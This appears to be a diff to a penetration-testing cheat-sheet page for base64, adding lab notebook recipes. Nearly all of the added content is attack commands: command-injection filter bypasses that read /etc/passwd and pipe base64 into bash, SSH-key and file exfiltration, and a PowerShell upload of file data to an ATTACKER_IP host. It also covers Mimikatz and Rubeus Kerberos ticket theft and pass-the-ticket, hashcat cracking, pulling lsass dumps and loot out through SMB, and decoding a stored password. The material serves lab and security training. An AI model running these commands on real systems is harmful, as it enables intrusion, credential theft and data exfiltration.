@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=base64) · [All tools](/index)
+
 ## Commands
 
 **Kali/Linux**
@@ -23,8 +25,214 @@ printf '%s' 'BASE64_TEXT' | base64 -d > file.zip
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=base64)
+## Notebook recipes
 
-## Learning and original examples
+15 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="Filter bypasses">
+
+### Filter bypasses
+
+**Command Injection: Quick Reference**
+
+```bash
+# spaces
+cat</etc/passwd            ${IFS}            {cat,/etc/passwd}
+# blacklisted chars / keywords
+c''at /et''c/pa''sswd      w`h`oami          /???/??t /etc/passwd
+# encode
+echo aWQ= | base64 -d | bash
+```
+
+</Accordion>
+
+<Accordion title="Phase 5 — Upgrading to an Interactive Reverse Shell">
+
+### Phase 5 — Upgrading to an Interactive Reverse Shell
+
+**Common Services: Personal Assessment Notes**
+
+```text
+echo "<base64>" | base64 -d | iconv -f UTF-16LE -t UTF-8
+```
+
+</Accordion>
+
+<Accordion title="Base64 Encode &amp; Decode">
+
+### Base64 Encode & Decode
+
+**File Transfers for Linux and Windows**
+
+```bash
+# On attack box — encode
+cat id_rsa | base64 -w 0; echo
+md5sum id_rsa
+
+# On target — decode
+echo -n '<base64_string>' | base64 -d > id_rsa
+md5sum id_rsa    # verify match
+```
+
+</Accordion>
+
+<Accordion title="Base64 Encode &amp; Decode (No Network Needed)">
+
+### Base64 Encode & Decode (No Network Needed)
+
+**File Transfers for Linux and Windows**
+
+```bash
+md5sum id_rsa                        # note the hash to verify later
+cat id_rsa | base64 -w 0; echo      # -w 0 = no line wrapping, one continuous string
+```
+
+**File Transfers for Linux and Windows**
+
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<paste base64 here>"))
+```
+
+</Accordion>
+
+<Accordion title="Base64 Encode &amp; Decode (Upload)">
+
+### Base64 Encode & Decode (Upload)
+
+**File Transfers for Linux and Windows**
+
+```powershell
+[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
+```
+
+**File Transfers for Linux and Windows**
+
+```bash
+echo <base64_string> | base64 -d > hosts
+md5sum hosts    # verify hash matches
+```
+
+</Accordion>
+
+<Accordion title="PowerShell Web Uploads">
+
+### PowerShell Web Uploads
+
+**File Transfers for Linux and Windows**
+
+```powershell
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\path\to\file' -Encoding Byte))
+Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
+```
+
+</Accordion>
+
+<Accordion title="4. Export Cached Tickets with Mimikatz">
+
+### 4. Export Cached Tickets with Mimikatz
+
+**Kerberoasting from Windows**
+
+```text
+base64 /out:true
+kerberos::list /export
+```
+
+</Accordion>
+
+<Accordion title="5. Rebuild a .kirbi File from Base64">
+
+### 5. Rebuild a .kirbi File from Base64
+
+**Kerberoasting from Windows**
+
+```bash
+cat encoded_file | base64 -d > sqldev.kirbi
+```
+
+</Accordion>
+
+<Accordion title="Quick Reference">
+
+### Quick Reference
+
+**Kerberoasting from Windows**
+
+```bash
+# Decode and convert an exported ticket
+cat encoded_file | base64 -d > ticket.kirbi
+python2.7 kirbi2john.py ticket.kirbi
+
+# Hashcat modes from the section
+hashcat -m 13100 rc4_hashes wordlist.txt
+hashcat -m 19700 aes256_hashes wordlist.txt
+```
+
+</Accordion>
+
+<Accordion title="Step 2b — Inject a stolen/forged ticket (the actual &quot;pass&quot;)">
+
+### Step 2b — Inject a stolen/forged ticket (the actual "pass")
+
+**Pass the Ticket from Windows**
+
+```cmd
+Rubeus.exe ptt /ticket:doIFujCCBba...        # base64 from asktgt/dump
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-...julio@krbtgt-inlanefreight.htb.kirbi   # a .kirbi file
+```
+
+**Pass the Ticket from Windows**
+
+```powershell
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
+```
+
+</Accordion>
+
+<Accordion title="Pulling files FROM the target to Kali (the hard direction)">
+
+### Pulling files FROM the target to Kali (the hard direction)
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+# 1) evil-winrm has it built in (pulls over your existing session):
+*Evil-WinRM* PS> download C:\Temp\lsass.dmp /home/kali/loot/lsass.dmp
+*Evil-WinRM* PS> upload /home/kali/tools/PrintSpoofer64.exe   # the reverse
+
+# 2) Stage through the DMZ (a host the internal box CAN reach):
+#    run smbserver on DMZ01, push from internal host, then SSH-pull DMZ->Kali
+impacket-smbserver share /tmp -smb2support -username u -password p     # ON DMZ01
+#    on the internal host:
+net use \\172.16.119.13\share /user:u p
+copy C:\Temp\loot.zip \\172.16.119.13\share\
+#    DMZ -> Kali:
+scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
+
+# 3) Reverse forward (ligolo listener_add or chisel/ssh -R), then smbserver/nc ON Kali
+#    becomes reachable from inside, push to it normally.
+
+# 4) base64 paste (small files / when nothing else works):
+#    Windows:  [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\x")) | clip
+#    Kali:     echo '<paste>' | base64 -d > x
+```
+
+</Accordion>
+
+<Accordion title="Passwords in unattend.xml">
+
+### Passwords in unattend.xml
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 
+SecretSecurePassword1234*
+```
+
+</Accordion>
+
+</AccordionGroup>
